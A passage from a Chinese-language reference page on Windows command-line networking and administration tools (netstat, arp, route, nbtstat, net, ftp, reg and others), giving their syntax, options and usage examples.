[-s]</code></pre><ul><li>-a：显示所有连接和侦听端口</li><li>-e：可以用来统计一些基本的网络流量</li><li>-n：显示数字化主机名，并且仅显示TCP连接</li><li>-r：显示关于路由表的信息，除了显示有效路由外还可显示当前有效的连接</li><li>-o：显示当前已建立的TCP连接状态的详细信息</li><li>-s：显示每个协议的统计信息</li><li>-p proto：显示proto指定的协议的连接，与-s一起使用时可显示每个协议的统计信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">netstat:: 显示网络连接情况netstat -n:: 显示数字化主机名，即IP地址；并且只显示TCP连接netstat -e:: 统计网络流量netstat -r:: 显示路由表信息netstat -o:: 查看当前活动的TCP连接信息netstat -a:: 查看当前所有活动的TCP连接以及侦听端口netstat -s -p tcp:: 查看本机所有TCP连接情况netstat -s -p udp:: 查看本机所有UDP连接情况netstat -s -p icmp:: 查看本机所有ICMP连接情况netstat -s -p ip:: 查看本机所有IP连接情况netstat -o 8:: 显示当前活动的TCP连接和进行ID，以后每隔8s会自动显示当前活动的TCP连接的PID进程</code></pre><h4 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h4><p>​        显示、修改IP-MAC映射列表</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ARP -s inet_addr eth_addr [if_addr]ARP -d inet_addr [if_addr]ARP -a [inet_addr] [-N if_addr] [-v]</code></pre><ul><li>a：显示本地计算机上所有接口的ARP缓存表信息</li><li>-s inet_addr eth_addr：将IP地址与网卡地址绑定</li><li>-d inet_addr：解除IP地址与网卡的绑定</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">arp -a:: 显示本地计算机所有接口的ARP缓存表arp -s 192.168.1.105 00-26-18-27-4A-8A:: 将IP地址192.168.1.105与MAC地址00-26-18-27-4A-8A绑定arp -d 192.168.1.105:: 解除IP地址192.168.1.105与网卡的绑定arp -d:: 解除所有IP地址与网卡的绑定</code></pre><h4 id="route"><a href="#route" class="headerlink" title="route"></a>route</h4><p>​        操作网络路由表</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ROUTE [-f] [-p] [-4|-6] command [destination]                  [MASK netmask]  [gateway] [METRIC metric]  [IF interface]</code></pre><ul><li><em>command</em>：对路由表的操作命令<ul><li>print：打印路由</li><li>add：添加路由</li><li>delete：删除路由</li><li>change：修改现有路由</li></ul></li><li>-p：添加永久路由</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">route print:: 显示完整的IP路由表route print 192.*:: 显示IP路由表以“192.”开始的路由信息route add 0.0.0.0 mask 0.0.0.0 192.168.1.1:: 添加192.168.1.1所在的网关为默认路由项route -p add 192.168.1.12 mask 255.255.255.255 192.168.2.1:: 添加一条到192.168.1.12的永久路由</code></pre><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>​        显示可用来诊断域名系统（DNS）基础结构的信息。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">nslookup [-opt ...]             # 使用默认服务器的交互模式nslookup [-opt ...] - server    # 使用 "server" 的交互模式nslookup [-opt ...] host        # 仅查找使用默认服务器的 "host"nslookup [-opt ...] host server # 仅查找使用 "server" 的 "host"</code></pre><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 检测DNS服务器nslookup www.baidu.com</code></pre><h4 id="nbtstat"><a href="#nbtstat" class="headerlink" title="nbtstat"></a>nbtstat</h4><p>​        显示协议统计和当前使用 NBI 的 TCP/IP 连接</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n]        [-r] [-R] [-RR] [-s] [-S] [interval] ]</code></pre><ul><li>-a：列出指定名称的远程机器的名称表</li><li>-A：列出指定IP的远程机器的名称表</li><li>-R：清除和重新加载远程缓存名称表</li><li>-RR：将名称释放包发送到WINS，然后启动刷新</li><li>-S：列出具有目标IP地址的会话表</li></ul><p><strong>eg</strong>:</p><pre class=" language-bat"><code class="language-bat">:: 探测对方计算机名称nbtstat -a 192.168.1.1:: 清除NetBIOS名称缓存信息，重新加载Lmhosts文件nbtstat -R:: 重新注册NetBIOS名称nbtstat -RR:: 统计NetBIOS会话信息,(每5秒统计一次)nbtstat -S 5</code></pre><h4 id="net"><a href="#net" class="headerlink" title="net"></a>net</h4><p>​        网络命令集及用户管理</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">NET    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |      STATISTICS | STOP | TIME | USE | USER | VIEW ]</code></pre><ul><li>view：查看局域网中运行的客户端</li><li>share：用于共享资源的管理、添加、删除以及查看局域网中的共享资源等</li><li>user：用于用户账户的管理、添加、删除等</li><li>statistics：主要用于显示本地工作站或服务器的统计记录</li><li>config：查看本地计算机上可配置的服务</li><li>localgroup：用于本地组的查看、管理等</li><li>session：计算机的会话操作</li><li>accounts：用户账户设置</li><li>time：用于查询、设定计算机的时间服务器</li><li>start：主要用于启动服务</li><li>stop：主要用于停止服务</li><li>pause：主要用于暂停服务</li><li>continue：主要用于重新激活当前暂停的服务</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 查看指定计算机的共享资源net view 192.168.1.105:: 查看局域网中正在运行的客户端net view:: 查看所有共享net share:: 设置ipc共享net share ipc:: 删除ipc共享net share ipc /del:: 设置C盘为共享net share C$=C::: 共享资源设置共享名注释net share 重要内部资源=D:\download /remark:'未经允许不得将资源外传':: 设置资源访问人数（最大访问人数为：8）net share 重要内部资源 /user:8:: 设置自动缓存方式net share 重要内部资料 /cache:automatic:: 禁止共享目录使用自动缓存net share 重要内部资料 /cache:no:: 查看本地的用户列表net user:: 添加一个用户net user 用户名 密码 /add:: 添加一个密码为空的用户net user 用户名 [""] /add:: 删除某个用户net user 用户名 /del:: 设置某个用户的状态为启用(禁用)net user 用户名 active:yes(no):: 禁止用户自行更改密码net user 用户名 /passwordchg:no:: 设置账户的主目录net user 用户名 /homedir:D\用户名:: 设置用户账户密码的最少字符数为：6net accounts /minpwlen:6:: 强制用户在4天内更改密码，且不允许8天内不更改密码net accounts /minpwage:4 /maxpwage:8:: 避免用户使用旧密码(强制用户不能使用8个历史记录内的密码)net accounts /uniquepw:8:: 查看计算机本地组列表net localgroup :: 查看管理员组里的用户net localgroup administrators:: 把某个用户添加到管理员组net localgroup administrators 用户名 /add:: 从管理员组中删除某个用户net localgroup administrators 用户名 /del- 添加到某个组里的用户必须时已经被创建过的用户- 添加的组必须为已存在的组:: 查看本地计算机上的统计服务net statistics:: 查看本地服务器服务的统计信息net statistics server:: 查看本地工作站服务统计信息net statistics workstation:: 查看本地计算机上可配置的服务net config:: 查看本机服务器上可配置的服务net config server:: 查看本地工作站上的配置服务net config workstation:: 在局域网中隐藏本地计算机net config server /hidden:yes:: 设置空闲会话时间(默认为15分钟，设置为-1则表示永远不中断用户连接)net config server /autodisconnect:8:: 设置本地计算机与网络中名为jackson-pc的计算机时间同步net time \\jackson-pc /set:: 断开计算机的会话操作net session /delete:: 查看已经启动的服务列表net start:: 开启某个服务（开启成功的前提时服务被停用而不是禁用）net start 服务名:: 停止某个服务（停止的服务必须是已经启动的）net stop 服务名:: 启动自动更新服务net start wuauserv:: 启动迟后打印服务net start spooler:: 启动时间管理服务net start "windows time":: 暂停服务器服务net pause server:: 激活服务器服务net continue server</code></pre><h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><p>​        文件传输</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">FTP [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [-b:asyncbuffers] [-w:windowsize] [host]</code></pre><ul><li>-A：匿名登录</li><li>-v：禁止显示远程服务器响应</li><li>-w:windowsize：覆盖默认的传输缓冲区大小</li><li>-a：在绑字数据连接时使用所有本地接口</li><li>-n：禁止在初始连接时自动登录</li><li>-g： 禁用文件名通配</li><li>-i：关闭多文件传输过程中的交互提示</li><li>-d：启动调试</li><li>-s:filename：指定包含 FTP 命令的文本文件；命令在 FTP 启动后自动运行</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 登录远程的FTP服务器fpt 192.168.1.12:: 匿名登录远程的FTP服务器ftp -A 192.168.1.12:: 屏蔽FTP服务器信息ftp -v 192.168.1.12:: 设置文件传输缓存大小为8092Bftp -w:8092 192.168.1.12:: 设置数据连接使用任何网络接口ftp -a 192.168.1.12:: 设置连接后禁止自动登录ftp -n 192.168.1.12:: 禁止使用文件通配符(默认ftp命令操作本地文件时允许使用通配符)ftp -g -A 192.168.1.12:: 屏蔽文件传输时的交互提示信息（默认在多个文件传输时会提示每个文件的传输信息）ftp -i -A 192.168.1.12:: 查看命令执行的详细信息(默认不显示执行命令的详细信息)ftp -d -A 192.168.1.12:: 登录后自动执行指定的(command.txt文件内的ftp命令)命令ftp -s:D:\command.txt -A 192.168.1.12------------------------------------------------------FTP子命令:: 使用该用户建立与192.168.1.12:21服务器的连接open 192.168.1.12 21:: 断开与远程服务器的连接close:: 断开与远程服务器的连接disconnect:: 退出FTP程序quit:: 退出FTP程序bye:: 切换命令行状态ftp         ::进入FTP程序!           ::切换到DOS模式下exit / ftp  :: 再次返回FTP程序中:: 设置文件传输模式(二进制 / ASCII文本)type binary / ascii:: 设置传输结束提示音bell:: 禁用通配符glob:: 查看命令执行状态status:: 创建远程文件夹demomkdir demo:: 更改服务器的当前目录(进入demo目录下)cd demo:: 设置FTP工作目录lcd D:\demo:: 查看远程目录列表dir :: 将远程目录列表保存到文件dir . dirlist.txt:: 显示远程目录列表mls - -:: 上传文件put 1.jpg:: 重命名远程文件rename 1.jpg one.jpg:: 下载服务器文件get one.jpg:: 删除远程文件delete one.jpg:: 删除远程文件夹rmdir demo:: 关闭文件传输询问方式prompt:: 禁止显示服务器响应信息verbose:: 切换用户登录user:: 显示函数调用序列(一次命令执行一次跟踪)trace</code></pre><h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>​        远程登录</p><h4 id="msg"><a href="#msg" class="headerlink" title="msg"></a>msg</h4><p>​        给用户发送消息</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">MSG {username | sessionname | sessionid | @filename | *}    [/SERVER:servername] [/TIME:seconds] [/V] [/W] [message]</code></pre><ul><li>username：标识指定的用户名</li><li>sessionname：会话名称</li><li>sessionid：会话ID</li><li>@filename：识别这样一个文件，该文件含有将所有消息发送到用户名、会话名和会话标识号的列表</li><li>*：给指定服务器上的所有会话发送消息</li><li>/SERVER:servername：要联系的服务器（默认是当前值）</li><li>/TIME:seconds：等待接收器确认消息的时间延迟</li><li>/V：显示有关执行的操作的信息</li><li>/W：等待用户的响应，跟/V一起使用</li><li>message：要发送的消息。如果没有指定会发出提示或者冲stdin读取</li></ul><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p>​        显示或修改系统日期</p><h4 id="time"><a href="#time" class="headerlink" title="time"></a>time</h4><p>​        显示或修改系统时间</p><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><p>​        安排在特定日期和时间运行命令和程序</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>​        立即或定时关闭或重启计算机</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">shutdown [-i]{[-s] | [-r] | [-I]} [-f] [-t time] [-c "消息内容"]</code></pre><ul><li>-i：显示图形用户界面，但必须是shutdown的第一项</li><li>-s：关闭计算机</li><li>-r：重新启动计算机</li><li>-I：注销当前用户</li><li>-f：强制关闭正在运行的应用程序，不在前台警告用户</li><li>-t time：后跟等待秒数，为0则表示马上重启</li><li>-c “消息内容”：输入关机对话框中的消息内容（不能超过127个字符）</li></ul><h4 id="taskkill"><a href="#taskkill" class="headerlink" title="taskkill"></a>taskkill</h4><p>​        结束进程</p><h4 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h4><p>​        显示进程列表</p><h4 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h4><p>​        对注册表子项信息和注册表项值中的值执行添加、更改、导入、导出以及其他操作</p><h5 id="reg-add"><a href="#reg-add" class="headerlink" title="reg add"></a>reg add</h5><p>​        将新的子项或项添加到注册表中</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Add KeyName [{/v ValueName | /ve}] [/t DataType] [/s Separator] [/d Data] [/f]</code></pre><ul><li>KeyName：指定要添加的子项或项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>/v ValueName：指定要添加到指定子项下的注册表项名称。</li><li>/ve：指定添加到注册表中的注册表项为空值。</li><li>/t DataType： 指定注册表项的类型。Type 必须是以下几种类型之一：<ul><li>Reg_SZ</li><li>Reg_MULTI_SZ</li><li>Reg_DWORD_BIG_ENDIAN</li><li>Reg_DWORD</li><li>Reg_BINARY</li><li>Reg_DWORD_LITTLE_ENDIAN</li><li>Reg_LINK</li><li>Reg_FULL_RESOURCE_DESCRIPTOR</li><li>Reg_EXPAND_SZ</li></ul></li><li>/s Separator：  当指定了 Reg_MULTI_SZ 数据类型并且需要列出多个项时，指定用来分隔数据的多个实例的字符。如果没有指定，将使用默认分隔符“\0”。</li><li>/d Data： 指定新注册表项的数据。</li><li>/f：添加注册表项而不要求确认。</li></ul><p><strong>注</strong>：</p><ul><li>该操作不能添加子树。该版本的 Reg 在添加子项时无需请求确认。</li><li>Reg Add 操作的返回值是0代表成功，是1代表失败。</li><li>对于 Reg_EXPAND_SZ 项类型，在 /d 参数内将插入符号 ( ^ ) 与“%”一起使用。</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要在远程计算机 ABC 上添加 HKLM\Software\MyCo 项，请键入：Reg ADD \\ABC\HKLM\Software\MyCo:: 要将一个注册表项添加到 HKLM\Software\MyCo，选项为值名：Data；类型：Reg_BINARY；数值数据：fe340ead；请键入：Reg ADD HKLM\Software\MyCo /v Data /t Reg_BINARY /d fe340ead:: 要将一个多值注册表项添加到 HKLM\Software\MyCo，选项为值名：MRU；数据类型：Reg_MULTI_SZ；数值数据：fax\0mail\0\0；请键入： Reg ADD HKLM\Software\MyCo /v MRU /t Reg_MULTI_SZ /d fax\0mail\0\0:: 要将一个扩展的注册表项添加到 HKLM\Software\MyCo，选项为值名：Path；数据类型：Reg_EXPAND_SZ；数值数据：%systemroot%；请键入：Reg ADD HKLM\Software\MyCo /v Path /t Reg_EXPAND_SZ /d ^%systemroot^%</code></pre><h5 id="reg-compare"><a href="#reg-compare" class="headerlink" title="reg compare"></a>reg compare</h5><p>​        比较指定的注册表子项或项</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Compare KeyName1 KeyName2 [{/v ValueName | /ve}] [{/oa | /od | /os | /on}] [/s]</code></pre><ul><li>KeyName1：指定要比较的第一个子项的完整路径。要指定远程计算机，请包括计算机名（以\\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>KeyName2：指定要比较的第二个子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。只在 KeyName2 中指定计算机名会导致该操作使用到 KeyName1 中指定的子项的路径。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是HKLM和HKU。</li><li>/v ValueName：指定要比较的子项下的值名称。</li><li>/ve： 指定只比较值名称为 null 的项。</li><li>/oa：指定显示所有不同点和匹配点。默认情况下，仅列出不同点。</li><li>/od：指定仅显示不同点。这是默认操作。</li><li>/os：指定仅显示匹配点。默认情况下，仅列出不同点。</li><li>/on：指定不显示任何内容。默认情况下，仅列出不同点。</li><li>/s：递归地比较所有子项和项。</li></ul><p><strong>注</strong>：</p><ul><li>reg compare操作的返回值<ul><li>0：比较成功且结果相同</li><li>1：比较失败</li><li>2：比较成功并找到不同点</li></ul></li><li>结果中显示的符号<ul><li><code>=</code>：KeyName1数据等于KeyName2数据</li><li><code>&lt;</code>：KeyName1数据小于KeyName2数据</li><li><code>&gt;</code>：KeyName1数据大于于KeyName2数据</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将 MyApp 项下的所有值与 SaveMyApp 项下的所有值进行比较，请键入：Reg COMPARE HKLM\Software\MyCo\MyApp HKLM\Software\MyCo\SaveMyApp:: 要比较 MyCo 项下的 Version 的值和 MyCo1 项下的 Version 的值，请键入：Reg COMPARE HKLM\Software\MyCo HKLM\Software\MyCo1 /v Version:: 要将计算机 ZODIAC 上 HKLM\Software\MyCo 下的所有子项和值与当前计算机上 HKLM\Software\MyCo 下的所有子项和值进行比较，请键入： Reg COMPARE \\ZODIAC\HKLM\Software\MyCo \\. /s</code></pre><h5 id="reg-copy"><a href="#reg-copy" class="headerlink" title="reg copy"></a>reg copy</h5><p>​        将一个注册表项复制到本地或远程计算机的指定位置</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Copy KeyName1 KeyName2 [/s] [/f] </code></pre><ul><li>KeyName1：指定要复制子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略\\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。 </li><li>KeyName2：指定子项目的地的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。 </li><li>/s：复制指定子项下的所有子项和项。 </li><li>/f：不要求确认而直接复制子项。 </li></ul><p><strong>注</strong>：</p><ul><li>在复制时reg不请求确认</li><li>reg copy操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将 MyApp 项下的所有子项和值复制到 SaveMyApp 项，请键入：Reg COPY HKLM\Software\MyCo\MyApp HKLM\Software\MyCo\SaveMyApp /s :: 要将计算机 ZODIAC 上的 MyCo 项下的所有值复制到当前计算机上的 MyCo1 项，请键入：Reg COPY \\ZODIAC\HKLM\Software\MyCo HKLM\Software\MyCo1 </code></pre><h5 id="reg-delete"><a href="#reg-delete" class="headerlink" title="reg delete"></a>reg delete</h5><p>​        从注册表删除子项或项</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Delete KeyName [{/v ValueName | /ve | /va}] [/f]</code></pre><ul><li>KeyName：指定要删除的子项或项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>/v ValueName：删除子项下的特定项。如果未指定项，则将删除子项下的所有项和子项。</li><li>/ve：指定只可以删除为空值的项。</li><li>/va：删除指定子项下的所有项。使用本参数不能删除指定子项下的子项。</li><li>/f：无需请求确认而删除现有的注册表子项或项。</li></ul><p><strong>注</strong>：</p><ul><li>reg delete的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要删除注册表项 Timeout 以及其所有子项和值，请键入：Reg DELETE HKLM\Software\MyCo\MyApp\Timeout :: 要删除计算机 ZODIAC 上 HKLM\Software\MyCo 下的注册表值 MTU，请键入：Reg DELETE \\ZODIAC\HKLM\Software\MyCo /v MTU</code></pre><h5 id="reg-export"><a href="#reg-export" class="headerlink" title="reg export"></a>reg export</h5><p>​         将本地计算机的指定子项、项和值复制到一个文件中，以便传输到其他服务器。 </p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg export KeyName FileName [/y]</code></pre><ul><li>KeyName：指定子项的完全路径。Export 操作仅可在本地计算机上工作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。 </li><li>FileName： 指定在操作期间创建的文件的名称和路径。该文件必须具有 .Reg 扩展名。 </li><li>/y：不要求确认即覆盖任何现有的名称为 FileName 的文件。 </li></ul><p><strong>注</strong>：</p><ul><li>reg export操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将 MyApp 项的所有子项和值的内容导出到文件 AppBkUp.Reg，请键入：Reg Export HKLM\Software\MyCo\MyApp AppBkUp.Reg</code></pre><h5 id="reg-import"><a href="#reg-import" class="headerlink" title="reg import"></a>reg import</h5><p>​        将包含已导出的注册表子项、项和值的文件的内容复制到本地计算机的注册表中。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">reg import FileName</code></pre><ul><li>FileName：指定其内容将复制到本地计算机注册表中的文件的名称和路径。此文件必须使用 Reg export 预先创建。 </li></ul><p><strong>注</strong>：</p><ul><li>reg import操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要从名为 AppBkUp.Reg 的文件导入注册表项，请键入：Reg Import AppBkUp.Reg</code></pre><h5 id="reg-load"><a href="#reg-load" class="headerlink" title="reg load"></a>reg load</h5><p>​        将保存的子项和项写回到注册表的不同子项中。与用于进行疑难解答或编辑注册表项的临时文件一起使用。 </p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg load KeyName FileName </code></pre><ul><li>KeyName：指定要加载的子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。 </li><li>FileName：指定要加载的文件的名称和路径。必须使用 .hiv 作为扩展名的 Reg Save 操作预先创建该文件。 </li></ul><p><strong>注</strong>：</p><ul><li>reg load操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">::要将名为 TempHive.hiv 的文件加载到 HKLM\TempHive 项，请键入：Reg LOAD HKLM\TempHive TempHive.hiv</code></pre><h5 id="reg-query"><a href="#reg-query" class="headerlink" title="reg query"></a>reg query</h5><p>​        返回位于注册表中指定的子项下的下一层子项和项的列表。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg query KeyName [{/v ValueName | /ve}] [/s] [/se Separator] [/f Data] [{/k | /d}] [/c] [/e] [/t Type] [/z]</code></pre><ul><li>KeyName：指定子项的完全路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>/v ValueName：指定要查询的注册表值名称。如果省略，则返回 KeyName 的所有值名称。如果还使用了 /f 选项，则此参数的 ValueName 是可选的。 </li><li>/ve：查询空白的值名称。</li><li>/s：指定该参数递归查询所有子项和值名称。</li><li>/se Separator：指定单值分隔符，以搜索 Reg_MULTI_SZ 类型的值名称。如果没有指定 Separator，则使用“\0”。</li><li>/f Data：指定要搜索的数据或模式。如果字符串包含空格，则使用双引号。如果未指定，则使用通配符 (“*”) 作为搜索模式。</li><li>/k：指定只在项名称中搜索。</li><li>/d：指定只在数据中搜索。</li><li>/c：指定查询是区分大小写的。默认情况下，查询是不区分大小写的。</li><li>/e：指定只返回完全匹配项。默认情况下，返回所有匹配项。</li><li>/t Type：指定要搜索的注册表类型。有效的类型包括：Reg_SZ、Reg_MULTI_SZ、Reg_EXPAND_SZ、Reg_DWORD、Reg_BINARY、Reg_NONE。如果未指定，则搜索所有类型。</li><li>/z：指定在搜索结果中包括注册表类型的数字同等物。</li></ul><p><strong>注</strong>：</p><ul><li>reg query操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要显示 HKLM\Software\Microsoft\ResKit 项中的名称值 Version 的值，请键入：Reg QUERY HKLM\Software\Microsoft\ResKit /v Version:: 要显示远程计算机 ABC 上的 HKLM\Software\Microsoft\ResKit\Nt\Setup 项下的所有子项和值，请键入：Reg QUERY \\ABC\HKLM\Software\Microsoft\ResKit\Nt\Setup /s:: 要使用“#”作为分隔符显示 Reg_MULTI_SZ 类型的所有子项和值，请键入：Reg QUERY HKLM\Software\Microsoft\ResKit\Nt\Setup /se #:: 要显示数据类型 Reg_SZ 的 HKLM 根下的“SYSTEM”的完全匹配并且区分大小写的匹配项的项、值和数据，请键入：Reg QUERY HKLM /f SYSTEM /t Reg_SZ /c /e:: 要显示数据类型 Reg_BINARY 的根键 HKCU 下的数据中的“0F”的匹配项的项、值和数据，请键入：Reg QUERY HKCU /f 0F /d /t Reg_BINARY:: 要显示 HKLM\SOFTWARE 下的值名称 null（默认值）的值和数据，请键入：Reg QUERY HKLM\SOFTWARE /ve</code></pre><h5 id="reg-restore"><a href="#reg-restore" class="headerlink" title="reg restore"></a>reg restore</h5><p>​        将保存的子项和项写回到注册表。 </p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg restore KeyName FileName</code></pre><ul><li>KeyName：指定要还原的子项的完整路径。Restore 操作仅在本地计算机上工作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。</li><li>FileName： 指定其内容将写回到注册表中的文件的名称和路径。必须使用 .hiv 作为扩展名的 Reg save 操作预先创建该文件。</li></ul><p><strong>注</strong>：</p><ul><li>编辑任何注册表项之前，请使用 Reg Save 操作保存父子项。如果编辑失败，则可以使用 Reg Restore 操作还原原来的子项。 </li><li>reg restore操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将名为 NTRKBkUp.hiv 的文件还原到 HKLM\Software\Microsoft\ResKit 项，并覆盖该项的现有内容，请键入：Reg RESTORE HKLM\Software\Microsoft\ResKit NTRKBkUp.hiv</code></pre><h5 id="reg-save"><a href="#reg-save" class="headerlink" title="reg save"></a>reg save</h5><p>​        将指定的子项、项和注册表值的副本保存到指定文件中。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg save KeyName FileName [/y]</code></pre><ul><li>KeyName： 指定子项的完全路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略\\ComputerName\会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>FileName：指定所创建的文件的名称和路径。如果未指定路径，则使用当前路径。</li><li>/y：不要求确认即覆盖任何现有的名称为 FileName 的文件。</li></ul><p><strong>注</strong>：</p><ul><li>reg save操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li><li>编辑任何注册表项之前，请使用 Reg Save 操作保存父子项。如果编辑失败，则可以使用 Reg Restore 操作还原原来的子项。</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将配置单元 MyApp 作为名为 AppBkUp.hiv 的文件保存到当前文件夹中，请键入：Reg SAVE HKLM\Software\MyCo\MyApp AppBkUp.hiv</code></pre><h5 id="reg-unload"><a href="#reg-unload" class="headerlink" title="reg unload"></a>reg unload</h5><p>​        使用 Reg Load 操作删除已加载的部分注册表。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Unload KeyName</code></pre><ul><li>KeyName：指定要卸载的子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li></ul><p><strong>注</strong>：</p><ul><li>reg unload操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要卸载 HKLM 中的配置单元 TempHive，请键入：Reg UNLOAD HKLM\TempHive</code></pre><h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" 